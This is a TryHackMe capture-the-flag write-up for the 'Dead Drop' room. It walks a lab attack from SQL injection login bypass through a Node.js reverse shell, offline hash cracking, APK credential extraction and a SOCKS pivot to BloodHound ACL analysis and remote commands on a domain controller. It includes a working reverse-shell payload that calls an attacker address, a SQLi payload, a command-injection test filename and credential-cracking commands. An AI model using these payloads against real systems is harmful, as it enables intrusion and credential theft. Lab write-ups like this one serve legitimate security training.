---
type: writeup
platform: TryHackMe
room: Dead Drop
os: Linux / Windows
environment: Web Application / Active Directory
last_verified: 2026-10-02

techniques:
  - service-enumeration
  - sql-injection
  - authentication-bypass
  - file-upload
  - remote-code-execution
  - credential-discovery
  - password-cracking
  - android-reverse-engineering
  - credential-reuse
  - pivoting
  - active-directory-enumeration
  - acl-abuse
  - remote-execution

tools:
  - nmap
  - gobuster
  - curl
  - netcat
  - john
  - ssh
  - scp
  - jadx
  - proxychains
  - netexec
  - bloodhound-python
  - bloodhound
---
**Attack path:** SQL injection → admin dashboard → JavaScript upload → `node` RCE → exposed shadow backup → SSH as `svc-drop` → APK credential disclosure → SOCKS pivot → BloodHound ACL analysis → privileged AD access → Domain Controller compromise

## 1. Reconnaissance

The room exposed an initial WebServer and an internal Active Directory environment:

| Host | Address | Role |
|---|---|---|
| WebServer | `<TARGET_IP>` | Initial foothold and later pivot |
| DEADDROP-DC | `<DC_IP>` | Domain Controller |
| DEADDROP-WRK | `<WORKSTATION_IP>` | Internal workstation |

The WebServer was the initial attack surface.

Service enumeration was performed with:

```bash
nmap -Pn -sC -sV <TARGET_IP>
```

Relevant results were:

```bash
22/tcp  open  ssh
80/tcp  open  http
```

The HTTP service was a Node.js/Express application exposing a login page.

A full TCP scan did not reveal additional relevant services:

```bash
nmap -Pn -p- --min-rate 1000 <TARGET_IP>
```

Content discovery was then performed:

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt

Interesting endpoints included:

/dashboard
/login
/logout
```


---

## 2. SQL Injection Authentication Bypass

The login form submitted:

```bash
username
password
```

to:

```bash
POST /login
```

Invalid credentials returned:

```bash
Invalid credentials
```

A boolean SQL injection payload was tested in the username field:

```sql
' OR '1'='1' -- -
```

Or using `curl`:

```bash
curl -i \
  --data-urlencode "username=' OR '1'='1' -- -" \
  --data-urlencode "password=test" \
  http://<TARGET_IP>/login
```

The response changed to:

```http
HTTP/1.1 302 Found
Location: /dashboard
Set-Cookie: connect.sid=<REDACTED>
```


The session cookie was saved for subsequent requests:

```bash
curl -i -c cookies.txt \
  --data-urlencode "username=' OR '1'='1' -- -" \
  --data-urlencode "password=test" \
  http://<TARGET_IP>/login
```

The dashboard was then accessed with:

```bash
curl -i -b cookies.txt http://<TARGET_IP>/dashboard
```

It identified the session as:

```bash
Logged in as admin
```

The SQL injection therefore provided only an **authentication bypass**, not operating-system access by itself.

---

## 3. File Upload → Node.js RCE

The authenticated dashboard exposed a file upload feature:

```html
<form method="POST" action="/upload" enctype="multipart/form-data">
```

A harmless file was uploaded first to understand how uploaded content was handled:

```bash
echo 'Hello DeadDrop' > test.txt

curl -i \
  -b cookies.txt \
  -F 'file=@test.txt' \
  http://<TARGET_IP>/upload
```

Uploaded files could then be accessed through:

```bash
/preview/<filename>
```

Several common file-handling weaknesses were briefly tested before moving to code execution.

Path traversal attempts through preview and filenames did not escape the upload directory.

A filename containing:

```bash
$(sleep 5)
```

was also stored literally and produced no timing delay, providing no evidence that rename operations were passed through a shell.

The more interesting observation was therefore:

```text
Node.js backend
+
uploaded files
+
server-side preview functionality
```

A Node.js reverse shell was created:

```javascript
(function(){
    const net = require("net");
    const cp = require("child_process");
    const sh = cp.spawn("/bin/bash", []);
    const client = new net.Socket();

    client.connect(4444, "<ATTACKER_IP>", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
})();
```

Uploading JavaScript alone was not sufficient to establish RCE.

The critical behaviour was that requesting the uploaded JavaScript through `/preview/<filename>` caused it to be processed server-side by the Node.js application.

### Determining the Callback Address

Because the AttackBox had multiple interfaces, the correct callback address was determined from the route used to reach the target:

```bash
ip route get <TARGET_IP>
```

The relevant result identified the VPN interface:

```bash
dev tun0 src <ATTACKER_IP>
```

A listener was started:

```bash
nc -lvnp 4444
```

The payload was uploaded:

```bash
curl -i \
  -b cookies.txt \
  -F 'file=@rev.js' \
  http://<TARGET_IP>/upload
```

and triggered:

```bash
curl -i \
  -b cookies.txt \
  http://<TARGET_IP>/preview/rev.js
```

The listener received a connection.

Verification showed:

```bash
whoami

node
```

The authenticated file functionality therefore provided **remote code execution as the `node` user**.

---

## 4. Credential Recovery from the Application Host

The shell landed inside the application environment under:

```bash
/opt/app
```

Files close to the application were enumerated:

```bash
find /opt/app \
  -maxdepth 2 \
  -type f \
  -ls
```

An interesting backup file appeared:

```bash
/opt/app/backup/shadow.bak
```

It contained an entry for:

```bash
svc-drop:$6$<REDACTED>:...
```

The `$6$` prefix identifies SHA-512 crypt.

The hash was saved into `hash.txt` and attacked offline:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512cryptbhash.txt

John successfully recovered the password:

svc-drop:<REDACTED>
```

The credential was then tested against the SSH service discovered during reconnaissance:

```bash
ssh svc-drop@<TARGET_IP>
```

Authentication succeeded.


---

## 5. Internal Mobile Application

Enumeration of the `svc-drop` home directory revealed:

```bash
backup/deaddrop-mobile.apk
```

The APK was copied to the AttackBox:

```bash
scp svc-drop@<TARGET_IP>:/home/svc-drop/backup/deaddrop-mobile.apk .
```

It was decompiled with JADX:

```bash
jadx -d deaddrop-src deaddrop-mobile.apk
```

Rather than searching the entire decompiled Android framework, the application's own package was inspected:

```bash
find deaddrop-src/sources/com/deaddrop/mobile -type f
```

Relevant files included:

```bash
Config.java
MainActivity.java
R.java
```

Credential-related strings were searched with:

```bash
grep -RniE \
  'username|password|credential|login|auth' \
  deaddrop-src/sources/com/deaddrop/mobile/
```

`Config.java` contained:

```java
public static final String DEFAULT_USERNAME = "j.harris";
public static final String DEFAULT_PASSWORD = "<REDACTED>";
```

The APK therefore exposed a reusable internal credential:

```bash
j.harris:<REDACTED>
```

This demonstrated why credentials should not be embedded directly inside client applications: an APK distributed to users can be statically analysed and its constants recovered.

---

## 6. Pivoting into the Internal Network

The Active Directory systems were located behind the compromised WebServer.

SSH access as `svc-drop` therefore provided a convenient pivot point.

A dynamic SOCKS proxy was created:

```bash
ssh \
  -N \
  -D 127.0.0.1:1080 \
  -o ServerAliveInterval=30 \
  svc-drop@<TARGET_IP>

Options:
ssh                         open an SSH connection to the compromised WebServer
-N                          do not execute a remote shell; use the connection only for forwarding
-D 127.0.0.1:1080           create a local dynamic SOCKS proxy on port 1080
-o ServerAliveInterval=30   send a keepalive message every 30 seconds to keep the SSH tunnel active
svc-drop@<TARGET_IP>        authenticate to the WebServer as svc-drop
```


The resulting path was:

```text
AttackBox
    ↓
SOCKS 127.0.0.1:1080
    ↓
SSH tunnel
    ↓
WebServer
    ↓
Internal AD network
```

ProxyChains was configured to use:

```bash
socks5 127.0.0.1 1080
```

Active Directory tooling also depended on resolving the Domain Controller by hostname, so a local mapping was added:

```bash
echo '<DC_IP> deaddrop-dc.deaddrop.loc deaddrop-dc deaddrop.loc' \
  >> /etc/hosts
```

The credentials recovered from the APK were then tested against SMB:

```bash
proxychains nxc smb <DC_IP> \
  -u 'j.harris' \
  -p '<REDACTED>' \
  -d deaddrop.loc
```

Authentication succeeded:

```bash
[+] deaddrop.loc\j.harris:<REDACTED> (Pwn3d!)
```

This confirmed:

```text
the SOCKS pivot worked
+
the APK credentials were valid
+
j.harris had administrative capability on the DC
```

`Pwn3d!` did not by itself explain the Active Directory privilege relationship, so the domain ACLs were examined next.

---

## 7. BloodHound Collection

BloodHound was used to collect domain objects, group memberships and ACL relationships through the pivot:

```bash
proxychains bloodhound-python \
  -u j.harris \
  -p '<REDACTED>' \
  -d deaddrop.loc \
  -ns <DC_IP> \
  -c All \
  --zip \
  --dns-tcp
```

Two options were particularly important in this environment.

```bash
-ns <DC_IP>
```

forced DNS queries toward the Domain Controller.

```bash
--dns-tcp
```

forced those DNS queries over TCP, allowing them to traverse the SOCKS pivot.

The collection succeeded and discovered:

```bash
1 domain
2 computers
8 users
55 groups
2 GPOs
9 OUs
22 containers
```

A ZIP archive suitable for import into BloodHound was generated.

### BloodHound Compatibility

The AttackBox contained newer BloodHound components while the available GUI used the Legacy format.

The collector that successfully produced compatible data identified itself as:

```bash
BloodHound.py for BloodHound LEGACY
```

During troubleshooting, the compatible Python package was restored with:

```bash
/usr/local/pyenv/versions/3.8.20/bin/pip install \
  --force-reinstall 'bloodhound==1.7.2'
```

This was an AttackBox tooling issue.

---

## 8. Active Directory ACL Analysis

The BloodHound archive was imported and the following user was examined:

```bash
J.HARRIS@DEADDROP.LOC
```

Its node information showed:

```bash
OUTBOUND OBJECT CONTROL

First Degree Object Control    15
Group Delegated Object Control 94
```

`First Degree Object Control` displayed Active Directory objects that `j.harris` could directly control.

The graph exposed multiple edges labelled:

```bash
AddMember
```

`AddMember` is not group membership itself.

It is an **ACL right that allows the principal to modify the membership of the controlled group**.

Conceptually:

```text
J.HARRIS
    │
    │ AddMember
    ▼
Controlled Group
```

If the controlled group is privileged, or participates in a privileged membership path, that ACL becomes a privilege-escalation primitive.

The target group expected by the room was:

```bash
ITSupport-Admins
```

and the privilege identified by BloodHound was:

```bash
AddMember
```

The BloodHound data also showed several privileged `AddMember` relationships in the collected graph.

The exact historical command used to change group membership was not preserved during the lab, so it is not reconstructed here as if it had definitely been executed.

This keeps the distinction clear between:

```text
observed ACL relationship
and
historically preserved exploitation command
```


---

## 9. Confirming Effective Domain Privileges

Rather than relying only on the BloodHound graph, the effective Windows token for `j.harris` was checked directly on the Domain Controller:

```bash
proxychains nxc smb <DC_IP> \
  -u 'j.harris' \
  -p '<REDACTED>' \
  -d deaddrop.loc \
  -x 'whoami /groups'
```

Relevant memberships included:

```bash
BUILTIN\Administrators
DEADDROP\Domain Admins
DEADDROP\ITSupport-Admins
```

This provided direct runtime evidence that the account had effective Domain Admin privileges in the final lab state.

NetExec also reported:

```bash
Executed command via wmiexec
```

confirming administrative remote command execution against the Domain Controller.

An interesting detail of this lab instance was that NetExec had already reported:

```bash
(Pwn3d!)
```

when the APK credentials were first validated.

The final `whoami /groups` output therefore provided stronger evidence of the actual Windows security context than the initial NetExec status alone.

---

## 10. Domain Controller Compromise

With administrative command execution confirmed, the Administrator desktop was enumerated:

```bash
proxychains nxc smb <DC_IP> \
  -u 'j.harris' \
  -p '<REDACTED>' \
  -d deaddrop.loc \
  -x 'dir C:\Users\Administrator\Desktop'
```

The output revealed:

```bash
flag.txt
```

The file was then read remotely:

```bash
proxychains nxc smb <DC_IP> \
  -u 'j.harris' \
  -p '<REDACTED>' \
  -d deaddrop.loc \
  -x 'type C:\Users\Administrator\Desktop\flag.txt'

Result:

THM{REDACTED}
```

The Domain Controller was compromised.

---

## Key Takeaways

- SQL injection did not directly compromise the host; it exposed authenticated functionality that became the next attack surface.
- File upload alone was not sufficient for RCE. The critical behaviour was the server-side processing of uploaded JavaScript through the Node.js preview functionality.
- Backup files can undermine otherwise restrictive system permissions. The readable shadow backup exposed a password hash that led to stable SSH access.
- Secrets embedded inside client applications such as APKs should be treated as recoverable through static analysis.
- Network segmentation did not prevent lateral movement once the WebServer became a usable pivot into the internal environment.
- `AddMember` demonstrates that Active Directory ACLs can represent privilege-escalation capabilities even without obtaining another user's password.
- BloodHound was useful not simply for enumerating objects, but for relating ACL control, group membership and privileged targets into an understandable attack path.